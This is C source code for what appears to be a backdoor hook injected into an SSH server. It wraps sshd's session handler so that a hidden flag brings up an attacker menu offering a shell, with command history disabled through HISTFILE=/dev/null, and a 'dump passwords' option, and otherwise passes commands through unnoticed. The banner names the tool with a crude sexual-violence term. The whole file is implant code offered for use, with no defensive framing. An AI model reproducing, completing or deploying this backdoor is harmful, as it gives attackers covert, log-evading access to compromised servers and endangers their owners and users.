#pragma GCC visibility push(protected)
#include "syscall.h"
#include "config.h"
#include "util.h"

extern void *hook_context;

typedef struct {
    int used;
    int self;
    int next_unused;
    void *pw;
    void *authctxt;
    int pid;

    /* tty */
    char    *term;
} Session;

typedef struct {
	config_block *config_memory;
	int (*do_child)(Session*, char*);
} hook_ctx;

int hook_main(Session *s, char *command) {
	char input[2];

	hook_ctx *ctx = (hook_ctx*)(&hook_context);

	char menu[]=
		"\n"
		"    >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n"
		"\n"
		"      _______  __________ ___.    _____     _____________  ______\n"
		"    _/  ____/_/  ____|   |   |   _\\ __ )_  _\\__   \\  __  \\/  __  )_ \n"
		"   /\\___   \\/\\___   \\|   '   |  |    /   \\/   _   /   /  /  __/___/_\n"
		"  /    /   /    /    /   |   \\  |   ,    /   /  . |  ___/   \\/     /\n"
		"  \\ _______\\ _______/____|____\\ |___:\\___\\_____/__|   | \\__________\\\n"
		"   \\/       \\/                                    \\___|\n"
		"\n"
		"                     **** SSH RAPE V0.9 BETA ****\n"
		"\n"
		"    <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<\n\n"
		"        [1] SHELL\n"
		"        [2] DUMP PASSWORDS\n"
		"        [3] EXIT\n\n";

	char prompt[]=
		"    CHOICE> ";

	char invalid_option[]=
		"\n    [!] ERROR: Invalid menu option!\n\n";

	char pass_str[]=
		"\nLOL passwords..\n\n";

	if (s->term != 0 && ctx->config_memory->is_haxor) {
		_write(1, menu, _strlen(menu));

		while(1) {
			_write(1, prompt, _strlen(prompt));
			_read(0, input, 2);
			switch(input[0]) {
				case '\r':
				case '\n':
 					continue;
				break;

				case '1':
					return ctx->do_child(s, "HISTFILE=/dev/null /bin/sh");
				break;

				case '2':
					_write(1, pass_str, _strlen(pass_str));
				break;

				case '3':
					return ctx->do_child(s, "exit");
				break;

				default:
					_write(1, invalid_option, _strlen(invalid_option));
				break;
			}
		}
	}
	
	return ctx->do_child(s, command);
}
